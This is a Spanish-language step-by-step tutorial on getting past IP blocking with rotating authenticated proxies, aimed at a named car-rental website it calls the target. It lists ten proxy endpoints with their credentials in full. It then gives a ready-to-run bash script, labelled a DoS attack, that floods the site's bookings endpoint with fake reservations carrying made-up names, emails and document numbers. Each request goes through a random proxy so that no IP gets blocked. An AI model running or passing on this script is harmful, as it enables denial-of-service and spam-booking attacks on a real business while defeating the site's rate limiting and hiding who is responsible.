# 012 — Cómo Saltarse el Bloqueo de IP usando Proxies

> **Duración:** 15 minutos  
> **Nivel:** Principiante  
> **Requisitos:** Solo tu terminal con `curl`

---

## ❓ ¿Qué problema resolvemos?

Cuando lanzas muchas peticiones desde tu PC, el servidor (Hostinger) detecta que todas vienen de la misma IP y te **bloquea**. Empiezas a recibir errores `403` o `429`.

**La solución:** Usar un **proxy**. Es como pedirle a otra computadora en otro país que haga la petición por ti. El servidor ve la IP del proxy, no la tuya.

```
SIN PROXY:  Tu PC (190.x.x.x) ──→ Servidor ──→ ❌ BLOQUEADO (misma IP 50 veces)

CON PROXY:  Tu PC ──→ Proxy UK (31.59.20.176) ──→ Servidor ──→ ✅ IP nueva, pasa
```

---

## 📋 Paso 1 — Crea el archivo de proxies

Copia y pega este comando **COMPLETO** en tu terminal. Esto crea un archivo `proxies.txt` con 10 proxies listos:

```bash
cat > proxies.txt << 'EOF'
31.59.20.176:6754:wvnqvmnp:tzc6kv4l6ope
198.23.239.134:6540:wvnqvmnp:tzc6kv4l6ope
45.38.107.97:6014:wvnqvmnp:tzc6kv4l6ope
107.172.163.27:6543:wvnqvmnp:tzc6kv4l6ope
198.105.121.200:6462:wvnqvmnp:tzc6kv4l6ope
216.10.27.159:6837:wvnqvmnp:tzc6kv4l6ope
142.111.67.146:5611:wvnqvmnp:tzc6kv4l6ope
191.96.254.138:6185:wvnqvmnp:tzc6kv4l6ope
31.58.9.4:6077:wvnqvmnp:tzc6kv4l6ope
23.26.71.145:5628:wvnqvmnp:tzc6kv4l6ope
EOF

echo "✅ Archivo proxies.txt creado con 10 proxies"
```

| # | País | Ciudad | IP |
|---|------|--------|----|
| 1 | 🇬🇧 Reino Unido | London | 31.59.20.176 |
| 2 | 🇺🇸 Estados Unidos | Buffalo | 198.23.239.134 |
| 3 | 🇬🇧 Reino Unido | London | 45.38.107.97 |
| 4 | 🇺🇸 Estados Unidos | Bloomingdale | 107.172.163.27 |
| 5 | 🇬🇧 Reino Unido | City of London | 198.105.121.200 |
| 6 | 🇺🇸 Estados Unidos | Dallas | 216.10.27.159 |
| 7 | 🇯🇵 Japón | Tokyo | 142.111.67.146 |
| 8 | 🇺🇸 Estados Unidos | Los Angeles | 191.96.254.138 |
| 9 | 🇩🇪 Alemania | Frankfurt | 31.58.9.4 |
| 10 | 🇺🇸 Estados Unidos | Orem | 23.26.71.145 |

---

## 🧪 Paso 2 — Comprueba que funciona

### 2a. Mira tu IP real (sin proxy)
```bash
curl -s https://api.ipify.org
```
> Anota el resultado. Esa es tu IP real de Colombia.

### 2b. Ahora mira tu IP con proxy (desde Londres)
```bash
curl -s -x "http://wvnqvmnp:tzc6kv4l6ope@31.59.20.176:6754" https://api.ipify.org
```
> Debe devolver una IP **diferente** (la del proxy en UK). Si es diferente, ¡funciona!

### 2c. Prueba otro proxy (desde Japón)
```bash
curl -s -x "http://wvnqvmnp:tzc6kv4l6ope@142.111.67.146:5611" https://api.ipify.org
```
> Debe devolver otra IP diferente (la del proxy en Tokyo).

**Si ambas IPs son distintas a la tuya → el enmascaramiento funciona. Eres invisible.**

---

## 🎯 Paso 3 — Usa el proxy para atacar Ocean Drive

Ahora que sabes que funciona, usa el proxy para enviar una petición al objetivo:

```bash
export TARGET="https://oceandrivecarental.com/server/public"

# Petición NORMAL (sin proxy, con tu IP real)
curl -s "$TARGET/vehicles"

# Petición ENMASCARADA (el servidor ve la IP de Londres, no la tuya)
curl -s -x "http://wvnqvmnp:tzc6kv4l6ope@31.59.20.176:6754" "$TARGET/vehicles"
```

Ambos comandos devuelven lo mismo, pero el segundo **nunca te bloquea** porque el servidor no reconoce tu IP.

---

## 🔄 Paso 4 — Rotación automática (para ataques sostenidos)

Cuando tu script de DoS manda muchas peticiones, necesitas **cambiar de proxy en cada petición** para que ninguna IP se queme. Copia y pega este script completo:

```bash
#!/bin/bash
# ═══════════════════════════════════════════════
# ATAQUE DoS CON ROTACIÓN DE PROXIES
# Cada petición sale desde un país diferente
# ═══════════════════════════════════════════════

TARGET="https://oceandrivecarental.com/server/public"

# Leer todos los proxies en un array
mapfile -t PROXIES < proxies.txt

echo "🔫 Proxies cargados: ${#PROXIES[@]}"
echo "🎯 Objetivo: $TARGET"
echo ""

# Cuántas peticiones enviar (cambia este número)
TOTAL=20

for i in $(seq 1 $TOTAL); do
    # Elegir un proxy al azar
    PROXY_LINE=${PROXIES[$RANDOM % ${#PROXIES[@]}]}
    IFS=':' read -r IP PORT USER PASS <<< "$PROXY_LINE"

    # Email único para cada petición
    EMAIL="spam${i}_${RANDOM}@test.com"

    # Lanzar la petición a través del proxy
    RESPONSE=$(curl -s -x "http://$USER:$PASS@$IP:$PORT" \
        -X POST "$TARGET/bookings" \
        -H "Content-Type: application/json" \
        -d "{
            \"category_id\": 1,
            \"start_date\": \"2026-10-10\",
            \"end_date\": \"2026-10-15\",
            \"customerDetails\": {
                \"fullName\": \"Test $i\",
                \"email\": \"$EMAIL\",
                \"phone\": \"555${RANDOM}\",
                \"docType\": \"CC\",
                \"docNumber\": \"${RANDOM}${RANDOM}\"
            }
        }")

    echo "[$i/$TOTAL] Proxy: $IP ($PORT) → $RESPONSE"
done

echo ""
echo "═══════════════════════════════════════════════"
echo "✅ Ataque finalizado. $TOTAL peticiones enviadas"
echo "   desde ${#PROXIES[@]} IPs diferentes."
echo "═══════════════════════════════════════════════"
```

### Para ejecutarlo:
```bash
# Guardar el script
nano ataque_proxy.sh
# (pega el código, Ctrl+O para guardar, Ctrl+X para salir)

# Dar permisos
chmod +x ataque_proxy.sh

# Lanzar
./ataque_proxy.sh
```

---

## 📖 Resumen Visual

```
PASO 1: Crear proxies.txt          → cat > proxies.txt << 'EOF' ...
PASO 2: Verificar enmascaramiento  → curl -s -x "http://user:pass@ip:port" https://api.ipify.org
PASO 3: Probar contra el objetivo  → curl -s -x "http://user:pass@ip:port" "$TARGET/vehicles"
PASO 4: Script con rotación        → ./ataque_proxy.sh
```

**La fórmula mágica de curl con proxy es siempre la misma:**
```
curl -x "http://USUARIO:PASSWORD@IP:PUERTO" [resto del comando normal]
```

Solo agregas `-x "http://wvnqvmnp:tzc6kv4l6ope@IP:PUERTO"` a cualquier comando curl que ya tengas y automáticamente sale enmascarado.
